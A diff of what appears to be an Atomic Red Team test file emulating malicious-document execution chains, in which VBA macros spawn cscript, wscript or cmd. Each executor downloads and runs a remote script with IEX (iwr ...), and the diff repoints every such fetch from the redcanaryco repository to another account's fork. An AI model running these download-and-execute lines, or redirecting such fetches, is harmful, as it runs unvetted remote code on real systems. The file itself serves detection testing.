@@ -5,7 +5,7 @@ atomic_tests:
   auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
   description: |
     This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
-    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 
     This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
     References:
@@ -37,7 +37,7 @@ atomic_tests:
       Stop-Process -Name WINWORD
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
@@ -70,7 +70,7 @@ atomic_tests:
   auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
   description: |
     This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
-    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
   supported_platforms:
   - windows
   input_arguments:
@@ -93,7 +93,7 @@ atomic_tests:
       Stop-Process -Name WINWORD
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
@@ -104,7 +104,7 @@ atomic_tests:
   description: |
     Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
 
-    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    Execution is handled by [Invoke-MalDoc](https://github.com/theclintox/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
   supported_platforms:
   - windows
   input_arguments:
@@ -131,7 +131,7 @@ atomic_tests:
       Stop-Process -Name WINWORD
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      IEX (iwr "https://raw.githubusercontent.com/theclintox/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
       $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
       Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
     cleanup_command: |
